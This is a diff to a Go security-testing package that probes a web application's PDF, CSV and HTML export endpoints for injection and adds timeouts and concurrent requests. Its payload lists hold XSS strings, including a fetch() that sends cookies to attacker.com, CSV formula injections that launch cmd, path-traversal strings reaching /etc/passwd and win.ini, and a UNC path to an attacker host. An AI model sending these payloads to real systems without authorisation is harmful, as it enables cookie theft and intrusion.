@@ -1,9 +1,12 @@
 package export
 
 import (
+	"context"
 	"fmt"
 	"net/http"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/sirupsen/logrus"
 )
@@ -17,6 +20,9 @@ type Tester struct {
 
 // New creates a new export tester instance
 func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
+	// Set reasonable timeouts
+	client.Timeout = 10 * time.Second
+
 	return &Tester{
 		logger:  logger,
 		client:  client,
@@ -28,9 +34,12 @@ func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
 func (t *Tester) RunTests(paths []string) error {
 	t.logger.Info("Starting export functionality security tests")
 
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
 	tests := []struct {
 		name string
-		fn   func([]string) error
+		fn   func(context.Context, []string) error
 	}{
 		{"PDF Export Injection", t.testPDFExport},
 		{"CSV Export Injection", t.testCSVExport},
@@ -39,17 +48,47 @@ func (t *Tester) RunTests(paths []string) error {
 		{"Export Format Manipulation", t.testExportFormat},
 	}
 
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(tests))
+
 	for _, test := range tests {
-		if err := test.fn(paths); err != nil {
-			t.logger.Warnf("%s test failed: %v", test.name, err)
+		wg.Add(1)
+		go func(tt struct {
+			name string
+			fn   func(context.Context, []string) error
+		}) {
+			defer wg.Done()
+			if err := tt.fn(ctx, paths); err != nil {
+				if !strings.Contains(err.Error(), "no such host") {
+					t.logger.Warnf("%s test failed: %v", tt.name, err)
+					select {
+					case errChan <- err:
+					default:
+					}
+				}
+			}
+		}(test)
+	}
+
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
 		}
 	}
 
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple test failures: %v", errs)
+	}
 	return nil
 }
 
 // testPDFExport tests for PDF export vulnerabilities
-func (t *Tester) testPDFExport(paths []string) error {
+func (t *Tester) testPDFExport(ctx context.Context, paths []string) error {
 	payloads := []string{
 		"<iframe src='javascript:alert(1)'></iframe>",
 		"<script>alert(document.domain)</script>",
@@ -61,34 +100,65 @@ func (t *Tester) testPDFExport(paths []string) error {
 		"<xml><%00 alert(1) %></xml>",
 	}
 
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(paths)*len(payloads))
+
 	for _, p := range paths {
 		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "pdf") {
 			continue
 		}
 
 		for _, payload := range payloads {
-			headers := map[string]string{
-				"Content-Type": "application/json",
-			}
-			data := fmt.Sprintf(`{"content":"%s"}`, payload)
+			wg.Add(1)
+			go func(path, pl string) {
+				defer wg.Done()
 
-			resp, err := t.makeRequestWithBody("POST", p+"?format=pdf", headers, data)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+				select {
+				case <-ctx.Done():
+					errChan <- ctx.Err()
+					return
+				default:
+					headers := map[string]string{
+						"Content-Type": "application/json",
+					}
+					data := fmt.Sprintf(`{"content":"%s"}`, pl)
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("PDF export injection possible with payload: %s", payload)
-			}
+					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=pdf", headers, data)
+					if err != nil {
+						if !strings.Contains(err.Error(), "no such host") {
+							errChan <- err
+						}
+						return
+					}
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						t.logger.Warnf("PDF export injection possible with payload: %s", pl)
+					}
+				}
+			}(p, payload)
 		}
 	}
 
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
+		}
+	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple PDF export test failures: %v", errs)
+	}
 	return nil
 }
 
 // testCSVExport tests for CSV export vulnerabilities
-func (t *Tester) testCSVExport(paths []string) error {
+func (t *Tester) testCSVExport(ctx context.Context, paths []string) error {
 	payloads := []string{
 		"=cmd|' /C calc'!A0",
 		"=@SUM(1+1)*cmd|' /C calc'!A0",
@@ -99,34 +169,65 @@ func (t *Tester) testCSVExport(paths []string) error {
 		"=1+1|cmd",
 	}
 
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(paths)*len(payloads))
+
 	for _, p := range paths {
 		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "csv") {
 			continue
 		}
 
 		for _, payload := range payloads {
-			headers := map[string]string{
-				"Content-Type": "application/json",
-			}
-			data := fmt.Sprintf(`{"data":"%s"}`, payload)
+			wg.Add(1)
+			go func(path, pl string) {
+				defer wg.Done()
 
-			resp, err := t.makeRequestWithBody("POST", p+"?format=csv", headers, data)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+				select {
+				case <-ctx.Done():
+					errChan <- ctx.Err()
+					return
+				default:
+					headers := map[string]string{
+						"Content-Type": "application/json",
+					}
+					data := fmt.Sprintf(`{"data":"%s"}`, pl)
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("CSV export injection possible with payload: %s", payload)
-			}
+					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=csv", headers, data)
+					if err != nil {
+						if !strings.Contains(err.Error(), "no such host") {
+							errChan <- err
+						}
+						return
+					}
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						t.logger.Warnf("CSV export injection possible with payload: %s", pl)
+					}
+				}
+			}(p, payload)
 		}
 	}
 
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
+		}
+	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple CSV export test failures: %v", errs)
+	}
 	return nil
 }
 
 // testHTMLExport tests for HTML export vulnerabilities
-func (t *Tester) testHTMLExport(paths []string) error {
+func (t *Tester) testHTMLExport(ctx context.Context, paths []string) error {
 	payloads := []string{
 		"<script>fetch('http://attacker.com/'+document.cookie)</script>",
 		"<img src=x onerror=alert(document.domain)>",
@@ -136,34 +237,65 @@ func (t *Tester) testHTMLExport(paths []string) error {
 		"<link rel=import href='data:text/html,<script>alert(1)</script>'>",
 	}
 
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(paths)*len(payloads))
+
 	for _, p := range paths {
 		if !strings.Contains(strings.ToLower(p), "export") && !strings.Contains(strings.ToLower(p), "html") {
 			continue
 		}
 
 		for _, payload := range payloads {
-			headers := map[string]string{
-				"Content-Type": "application/json",
-			}
-			data := fmt.Sprintf(`{"content":"%s"}`, payload)
+			wg.Add(1)
+			go func(path, pl string) {
+				defer wg.Done()
 
-			resp, err := t.makeRequestWithBody("POST", p+"?format=html", headers, data)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+				select {
+				case <-ctx.Done():
+					errChan <- ctx.Err()
+					return
+				default:
+					headers := map[string]string{
+						"Content-Type": "application/json",
+					}
+					data := fmt.Sprintf(`{"content":"%s"}`, pl)
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("HTML export injection possible with payload: %s", payload)
-			}
+					resp, err := t.makeRequestWithBody(ctx, "POST", path+"?format=html", headers, data)
+					if err != nil {
+						if !strings.Contains(err.Error(), "no such host") {
+							errChan <- err
+						}
+						return
+					}
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						t.logger.Warnf("HTML export injection possible with payload: %s", pl)
+					}
+				}
+			}(p, payload)
 		}
 	}
 
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
+		}
+	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple HTML export test failures: %v", errs)
+	}
 	return nil
 }
 
 // testExportParams tests for export parameter vulnerabilities
-func (t *Tester) testExportParams(paths []string) error {
+func (t *Tester) testExportParams(ctx context.Context, paths []string) error {
 	params := []string{
 		"format=../../../../etc/passwd",
 		"type=../../windows/win.ini",
@@ -173,34 +305,68 @@ func (t *Tester) testExportParams(paths []string) error {
 		"path=\\\\attacker.com\\share\\file.txt",
 	}
 
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(paths)*len(params))
+
 	for _, p := range paths {
 		if !strings.Contains(strings.ToLower(p), "export") {
 			continue
 		}
 
 		for _, param := range params {
-			resp, err := t.makeRequest("GET", p+"?"+param, nil)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+			wg.Add(1)
+			go func(path, prm string) {
+				defer wg.Done()
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Export parameter injection possible with: %s", param)
-			}
+				select {
+				case <-ctx.Done():
+					errChan <- ctx.Err()
+					return
+				default:
+					resp, err := t.makeRequest(ctx, "GET", path+"?"+prm, nil)
+					if err != nil {
+						if !strings.Contains(err.Error(), "no such host") {
+							errChan <- err
+						}
+						return
+					}
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						t.logger.Warnf("Export parameter injection possible with: %s", prm)
+					}
+				}
+			}(p, param)
 		}
 	}
 
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
+		}
+	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple export parameter test failures: %v", errs)
+	}
 	return nil
 }
 
 // testExportFormat tests for export format manipulation
-func (t *Tester) testExportFormat(paths []string) error {
+func (t *Tester) testExportFormat(ctx context.Context, paths []string) error {
 	formats := []string{
 		"php", "jsp", "asp", "aspx",
 		"config", "xml", "ini", "sh",
 		"htaccess", "htpasswd", "env",
 	}
+
+	var wg sync.WaitGroup
+	errChan := make(chan error, len(paths)*len(formats))
 
 	for _, p := range paths {
 		if !strings.Contains(strings.ToLower(p), "export") {
@@ -208,24 +374,52 @@ func (t *Tester) testExportFormat(paths []string) error {
 		}
 
 		for _, format := range formats {
-			resp, err := t.makeRequest("GET", p+"?format="+format, nil)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+			wg.Add(1)
+			go func(path, fmt string) {
+				defer wg.Done()
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Dangerous export format accepted: %s", format)
-			}
+				select {
+				case <-ctx.Done():
+					errChan <- ctx.Err()
+					return
+				default:
+					resp, err := t.makeRequest(ctx, "GET", path+"?format="+fmt, nil)
+					if err != nil {
+						if !strings.Contains(err.Error(), "no such host") {
+							errChan <- err
+						}
+						return
+					}
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						t.logger.Warnf("Dangerous export format accepted: %s", fmt)
+					}
+				}
+			}(p, format)
 		}
 	}
 
+	wg.Wait()
+	close(errChan)
+
+	// Collect any errors
+	var errs []error
+	for err := range errChan {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			errs = append(errs, err)
+		}
+	}
+
+	if len(errs) > 0 {
+		return fmt.Errorf("multiple export format test failures: %v", errs)
+	}
 	return nil
 }
 
 // makeRequest performs an HTTP request
-func (t *Tester) makeRequest(method, path string, headers map[string]string) (*http.Response, error) {
-	req, err := http.NewRequest(method, t.baseURL+path, nil)
+func (t *Tester) makeRequest(ctx context.Context, method, path string, headers map[string]string) (*http.Response, error) {
+	req, err := http.NewRequestWithContext(ctx, method, t.baseURL+path, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -234,12 +428,21 @@ func (t *Tester) makeRequest(method, path string, headers map[string]string) (*h
 		req.Header.Set(k, v)
 	}
 
-	return t.client.Do(req)
+	resp, err := t.client.Do(req)
+	if err != nil {
+		// Skip DNS resolution errors
+		if strings.Contains(err.Error(), "no such host") {
+			return nil, err
+		}
+		return nil, fmt.Errorf("request failed: %w", err)
+	}
+
+	return resp, nil
 }
 
 // makeRequestWithBody performs an HTTP request with a body
-func (t *Tester) makeRequestWithBody(method, path string, headers map[string]string, body string) (*http.Response, error) {
-	req, err := http.NewRequest(method, t.baseURL+path, strings.NewReader(body))
+func (t *Tester) makeRequestWithBody(ctx context.Context, method, path string, headers map[string]string, body string) (*http.Response, error) {
+	req, err := http.NewRequestWithContext(ctx, method, t.baseURL+path, strings.NewReader(body))
 	if err != nil {
 		return nil, err
 	}
@@ -248,5 +451,14 @@ func (t *Tester) makeRequestWithBody(method, path string, headers map[string]str
 		req.Header.Set(k, v)
 	}
 
-	return t.client.Do(req)
+	resp, err := t.client.Do(req)
+	if err != nil {
+		// Skip DNS resolution errors
+		if strings.Contains(err.Error(), "no such host") {
+			return nil, err
+		}
+		return nil, fmt.Errorf("request failed: %w", err)
+	}
+
+	return resp, nil
 }
